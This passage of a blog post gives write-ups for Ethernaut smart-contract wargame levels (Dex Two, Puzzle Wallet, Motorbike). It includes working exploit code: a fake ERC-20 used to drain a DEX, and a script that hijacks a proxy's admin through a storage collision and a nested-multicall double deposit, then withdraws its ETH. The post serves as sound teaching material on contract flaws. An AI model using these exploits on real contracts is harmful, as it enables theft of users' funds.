class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    string public name = &quot;EvilToken&quot;;</span><br><span class="line">    string public symbol = &quot;EVIL&quot;;</span><br><span class="line">    uint8  public constant decimals = 18;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        uint256 amt = 1_000_000 ether;</span><br><span class="line">        totalSupply = amt;</span><br><span class="line">        balanceOf[msg.sender] = amt;</span><br><span class="line">        emit Transfer(address(0), msg.sender, amt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool) &#123;</span><br><span class="line">        allowance[msg.sender][spender] = amount;</span><br><span class="line">        emit Approval(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) external returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external returns (bool) &#123;</span><br><span class="line">        uint256 allowed = allowance[from][msg.sender];</span><br><span class="line">        if (allowed != type(uint256).max) &#123;</span><br><span class="line">            require(allowed &gt;= amount, &quot;ALLOWANCE&quot;);</span><br><span class="line">            unchecked &#123; allowance[from][msg.sender] = allowed - amount; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address from, address to, uint256 amount) internal &#123;</span><br><span class="line">        require(to != address(0), &quot;ZERO_TO&quot;);</span><br><span class="line">        uint256 bal = balanceOf[from];</span><br><span class="line">        require(bal &gt;= amount, &quot;BAL&quot;);</span><br><span class="line">        unchecked &#123; balanceOf[from] = bal - amount; &#125;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The process of calling the function in the console is as follows: first approve the authorization, then extract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//  Withdraw token1/token2</span><br><span class="line">const token1 = await contract.token1();</span><br><span class="line">const token2 = await contract.token2();</span><br><span class="line"></span><br><span class="line">const provider = new _ethers.providers.Web3Provider(window.ethereum);</span><br><span class="line">await provider.send(&quot;eth_requestAccounts&quot;, []);</span><br><span class="line">const signer = provider.getSigner();</span><br><span class="line"></span><br><span class="line">const evil = new _ethers.Contract(</span><br><span class="line">  evilAddr,</span><br><span class="line">  [</span><br><span class="line">    &quot;function approve(address,uint256) returns (bool)&quot;,</span><br><span class="line">    &quot;function transfer(address,uint256) returns (bool)&quot;,</span><br><span class="line">    &quot;function balanceOf(address) view returns (uint256)&quot;</span><br><span class="line">  ],</span><br><span class="line">  signer</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// Authorize DexTwo to spend your EVIL (very important!)</span><br><span class="line">await evil.approve(instance, _ethers.constants.MaxUint256);</span><br><span class="line"></span><br><span class="line">// Transfer 1 EVIL to DexTwo first, to establish the denominator = 1</span><br><span class="line">await evil.transfer(instance, 1);</span><br><span class="line"></span><br><span class="line">let rFrom = await evil.balanceOf(instance);   // Read the EVIL currently held by Dex (should be 1)</span><br><span class="line">await contract.swap(evilAddr, token1, rFrom); // amount=1, take all token1 at once</span><br><span class="line"></span><br><span class="line">rFrom = await evil.balanceOf(instance);       // Reread! This should be 2</span><br><span class="line">await contract.swap(evilAddr, token2, rFrom); // amount=2，take all token2 at once</span><br><span class="line"></span><br><span class="line">// check it out (both sides should be &quot;0&quot;)</span><br><span class="line">(await contract.balanceOf(token1, instance)).toString();</span><br><span class="line">(await contract.balanceOf(token2, instance)).toString();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2025/10/14/Ethernaut-Challenges/swap_flow.png" class="" title="swap_flow.png">

<img src="/2025/10/14/Ethernaut-Challenges/uniswap_v2_swap_timeline.png" class="" title="uniswap_v2_swap_timeline.png">

<p>The above is a process of swap</p>
<h3 id="Puzzle-Wallet"><a href="#Puzzle-Wallet" class="headerlink" title="Puzzle Wallet"></a>Puzzle Wallet</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/UpgradeableProxy-08.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PuzzleProxy is UpgradeableProxy &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _admin, address _implementation, bytes memory _initData)</span><br><span class="line">        UpgradeableProxy(_implementation, _initData)</span><br><span class="line">    &#123;</span><br><span class="line">        admin = _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin() &#123;</span><br><span class="line">        require(msg.sender == admin, &quot;Caller is not the admin&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">        pendingAdmin = _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;</span><br><span class="line">        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);</span><br><span class="line">        admin = pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address _newImplementation) external onlyAdmin &#123;</span><br><span class="line">        _upgradeTo(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PuzzleWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    mapping(address =&gt; bool) public whitelisted;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function init(uint256 _maxBalance) public &#123;</span><br><span class="line">        require(maxBalance == 0, &quot;Already initialized&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted() &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">        require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class="line">        whitelisted[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">        require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -= value;</span><br><span class="line">        (bool success,) = to.call&#123;value: value&#125;(data);</span><br><span class="line">        require(success, &quot;Execution failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled = false;</span><br><span class="line">        for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success,) = address(this).delegatecall(data[i]);</span><br><span class="line">            require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The core of the vulnerability here is that delegatecall inherits the msg.value at the moment of the call. No matter how many times it is called, the actual balance of the proxy contract will not change. However, if you use delegatecall to call deposit multiple times, a false accounting vulnerability will occur.</p>
<p>At the same time, since the proxy contract calls delegatecall, the storage slot of the proxy contract is used. The owner and maxBalance of PuzzleWallet are written to the pendingAdmin and admin positions of the proxy.</p>
<p>Using this, we can whitelist the attacker’s address and then proceed with the attack described in step 1.</p>
<p>The attack flow is as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">const instance = &quot;0xProxyAddress&quot;;      </span><br><span class="line">const player   = &quot;0xYourEOA&quot;;</span><br><span class="line"></span><br><span class="line">const proxyAbi  = [</span><br><span class="line">  &quot;function proposeNewAdmin(address _newAdmin) external&quot;,</span><br><span class="line">  &quot;function admin() public view returns (address)&quot;</span><br><span class="line">];</span><br><span class="line">const walletAbi = [</span><br><span class="line">  &quot;function addToWhitelist(address) external&quot;,</span><br><span class="line">  &quot;function deposit() external payable&quot;,</span><br><span class="line">  &quot;function multicall(bytes[] calldata) external payable&quot;,</span><br><span class="line">  &quot;function execute(address to, uint256 value, bytes calldata data) external payable&quot;,</span><br><span class="line">  &quot;function setMaxBalance(uint256) external&quot;,</span><br><span class="line">  &quot;function balances(address) external view returns (uint256)&quot;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">const proxy   = new web3.eth.Contract(proxyAbi,  instance);</span><br><span class="line">const wallet  = new web3.eth.Contract(walletAbi, instance);</span><br><span class="line"></span><br><span class="line">// Use Proxy to write slot0 → Let the owner from the Wallet perspective = player</span><br><span class="line">await proxy.methods.proposeNewAdmin(player).send(&#123;from: player&#125;);</span><br><span class="line"></span><br><span class="line">// Now use Wallet ABI to adjust Proxy and add whitelist to yourself</span><br><span class="line">await wallet.methods.addToWhitelist(player).send(&#123;from: player&#125;);</span><br><span class="line"></span><br><span class="line">// Construct a &quot;nested multicall&quot; to record the same msg.value N times (in this example, N=3)</span><br><span class="line">const dep = wallet.methods.deposit().encodeABI();</span><br><span class="line">function buildNestedMulticall(N) &#123;</span><br><span class="line">  if (N &lt;= 1) return [dep];</span><br><span class="line">  let inner = [dep];</span><br><span class="line">  for (let i = 2; i &lt;= N; i++) &#123;</span><br><span class="line">    inner = [dep, wallet.methods.multicall(inner).encodeABI()];</span><br><span class="line">  &#125;</span><br><span class="line">  return inner;</span><br><span class="line">&#125;</span><br><span class="line">const dataN = buildNestedMulticall(3); // Just change the number: repeat the account N times</span><br><span class="line"></span><br><span class="line">// Only transfer 0.001 ETH once, but increase balances[player] N times</span><br><span class="line">await wallet.methods.multicall(dataN).send(&#123;</span><br><span class="line">  from:  player,</span><br><span class="line">  value: web3.utils.toWei(&quot;0.001&quot;, &quot;ether&quot;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">(await wallet.methods.balances(player).call()).toString();</span><br><span class="line"></span><br><span class="line">// Withdraw all of the Proxy&#x27;s real ETH balance (must be cleared to 0 before settingMaxBalance)</span><br><span class="line">const bal = await web3.eth.getBalance(instance);</span><br><span class="line">if (bal !== &quot;0&quot;) &#123;</span><br><span class="line">  await wallet.methods.execute(player, bal, &quot;0x&quot;).send(&#123;from: player&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">await web3.eth.getBalance(instance); // should return &quot;0&quot;</span><br><span class="line"></span><br><span class="line">// Write slot1 → Set admin to yourself (write the address as uint256, the lower 160 bits are your address)</span><br><span class="line">await wallet.methods.setMaxBalance(web3.utils.toBN(player)).send(&#123;from: player&#125;);</span><br><span class="line"></span><br><span class="line">await proxy.methods.admin().call();  // should be player</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Motorbike"><a href="#Motorbike" class="headerlink" title="Motorbike"></a>Motorbike</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Motorbike &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span><br><span class="line">    constructor(address _logic) public &#123;</span><br><span class="line">        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;</span><br><span class="line">        (bool success,) = _logic.delegatecall(abi.encodeWithSignature(&quot;initialize()&quot;));</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Delegates the current call to `implementation`.</span><br><span class="line">    function _delegate(address implementation) internal virtual &#123;</span><br><span class="line">        // solhint-disable-next-line no-inline-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line">            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)</span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line">            switch result</span><br><span class="line">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class="line">            default &#123; return(0, returndatasize()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Fallback function that delegates calls to the address returned by `_implementation()`.</span><br><span class="line">    // Will run if no other function in the contract matches the call data</span><br><span class="line">    fallback() external payable virtual &#123;</span><br><span class="line">        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Returns an `AddressSlot` with member `value` located at `slot`.</span><br><span class="line">    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Engine is Initializable &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    address public upgrader;</span><br><span class="line">    uint256 public horsePower;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize() external initializer &#123;</span><br><span class="line">        horsePower = 1000;</span><br><span class="line">        upgrader = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Upgrade the implementation of the proxy to `newImplementation`</span><br><span class="line">    // subsequently execute the function call</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;</span><br><span class="line">        _authorizeUpgrade();</span><br><span class="line">        _upgradeToAndCall(newImplementation, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Restrict to upgrader role</span><br><span class="line">    function _authorizeUpgrade() internal view &#123;</span><br><span class="line">        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span><br><span class="line">    function _upgradeToAndCall(address newImplementation, bytes memory data) internal &#123;</span><br><span class="line">        // Initial upgrade and setup call</span><br><span class="line">        _setImplementation(newImplementation);</span><br><span class="line">        if (data.length &gt; 0) &#123;</span><br><span class="line">            (bool success,) = newImplementation.delegatecall(data);</span><br><span class="line">            require(success, &quot;Call failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Stores a new address in the EIP1967 implementation slot.</span><br><span class="line">    function _setImplementation(address newImplementation) private &#123;</span><br><span class="line">        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line"></span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := _IMPLEMENTATION_SLOT</span><br><span class="line">        &#125;</span><br><span class="line">        r.value = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>As mentioned earlier, when contract A calls contract B via delegatecall, the data is written to contract A’s storage slot.</p>
<p>So the problem here is that the Engine contract hasn’t been fully initialized. Its upgrader and horsePower are both at their default values.</p>
<p>So here we can manually call the initialize function of Engine to set the upgrader to ourselves, then call the upgradeToAndCall function and use delegatecall to trigger selfdestruct(). There is a problem here:</p>
<p><strong>EIP-6780 changed the semantics of <code>SELFDESTRUCT</code>:</strong></p>
<p>Unless the contract is created and self-destructed in the same transaction, <code>selfdestruct</code> will no longer clear the bytecode&#x2F;storage, but will only transfer the balance.</p>
<p>Therefore, we can only destroy it when initializing the engine (make sure it’s in the same transaction).</p>
<p>check this <a target="_blank" rel="noopener" href="https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/">https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/</a></p>
<h3 id="DoubleEntryPoint"><a href="#DoubleEntryPoint" class="headerlink" title="DoubleEntryPoint"></a>DoubleEntryPoint</h3><p>Waiting for update</p>
<h2 id="Attack-Template"><a href="#Attack-Template" class="headerlink" title="Attack Template"></a>Attack Template</h2><p>deploy on sepolia testnet</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge create Attack --rpc-url https://sepolia.infura.io/v3/xx --private-key 0xxx --broadcast -vvv</span><br></pre></td></tr></table></figure>

<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get the provider injected by Metamask</span></span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> _ethers.<span class="title class_">BrowserProvider</span>(<span class="variable language_">window</span>.<span class="property">ethereum</span>);</span><br><span class="line"><span class="comment">// v5 is called Web3Provider, v6 is called BrowserProvider</span></span><br><span class="line"><span class="comment">//const provider = new _ethers.providers.Web3Provider(window.ethereum);</span></span><br><span class="line"><span class="keyword">const</span> signer = <span class="keyword">await</span> provider.<span class="title function_">getSigner</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ABI of attack contract</span></span><br><span class="line"><span class="keyword">const</span> attack = <span class="keyword">new</span> _ethers.<span class="title class_">Contract</span>(</span><br><span class="line">  <span class="string">&quot;0xYourAttackContractAddress&quot;</span>,</span><br><span class="line">  [</span><br><span class="line">    <span class="string">&quot;function exploit() payable&quot;</span>,</span><br><span class="line">    <span class="string">&quot;function sweep(address to) external&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  signer</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// attack</span></span><br><span class="line"><span class="keyword">await</span> attack.<span class="title function_">exploit</span>(&#123;</span><br><span class="line">  <span class="attr">value</span>: _ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&quot;0.0005&quot;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// await solver.pwn(engine, &#123; gasLimit: 1_000_000 &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> attack.<span class="title function_">sweep</span>(<span class="keyword">await</span> signer.<span class="title function_">getAddress</span>());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/11/30/JNI%E5%87%BD%E6%95%B0%E7%9A%84Hook%E4%B8%8E%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D/" rel="prev" title="JNI函数的Hook与快速定位">
      <i class="fa fa-chevron-left"></i> JNI函数的Hook与快速定位
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
